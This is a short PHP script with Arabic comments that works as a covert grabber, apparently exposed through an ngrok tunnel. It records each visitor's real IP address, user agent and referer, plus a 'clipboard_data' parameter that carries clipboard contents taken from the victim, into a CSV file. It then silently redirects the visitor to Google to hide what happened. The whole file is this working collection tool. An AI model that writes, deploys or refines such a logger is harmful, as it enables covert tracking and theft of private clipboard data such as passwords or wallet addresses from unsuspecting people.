<?php
date_default_timezone_set('Europe/Berlin');

$logFile = 'access_logs.csv';

// *** الوظيفة الجديدة لسحب IP الحقيقي ***
function get_real_ip() {
    // 1. التحقق من رأس Ngrok (الذي يحتوي على IP العميل الحقيقي)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    // 2. التحقق من رأس HTTP_CLIENT_IP
    elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    // 3. العودة للطريقة العادية (IP الخادم المحلي)
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // Ngrok قد يمرر قائمة من IPs، نأخذ أول واحد (الأكثر شيوعاً)
    $ip_list = explode(',', $ip);
    return trim($ip_list[0]);
}

// *** تطبيق الوظيفة ***
$time = date('Y-m-d H:i:s');
$ip = get_real_ip(); // سحب IP الحقيقي الآن
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
$userAgent = str_replace(array("\n", "\r", ","), ' ', $userAgent);
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';

// استقبال بيانات الحافظة 
$clipboard_data = isset($_GET['clipboard_data']) ? $_GET['clipboard_data'] : 'N/A';
$clipboard_data = str_replace(array("\n", "\r", ","), ' ', $clipboard_data);

// إعداد سطر السجل
// تم تغيير الترتيب هنا لإضافة حقل Clipboard-Data كما في نهاية الكود الأصلي
$logEntry = "\"$time\",\"$ip\",\"$userAgent\",\"$referer\",\"$clipboard_data\"\n";

// إنشاء رأس الملف (للتأكد من وجود جميع الأعمدة)
if (!file_exists($logFile) || filesize($logFile) == 0) {
    // إضافة Clipboard-Data إلى رأس الملف
    file_put_contents($logFile, "Time,IP,User-Agent,Referer,Clipboard-Data\n");
}

// حفظ السجل
file_put_contents($logFile, $logEntry, FILE_APPEND);

// إعادة التوجيه إلى جوجل
header('Location: https://google.com', true, 303);
exit; 
?>
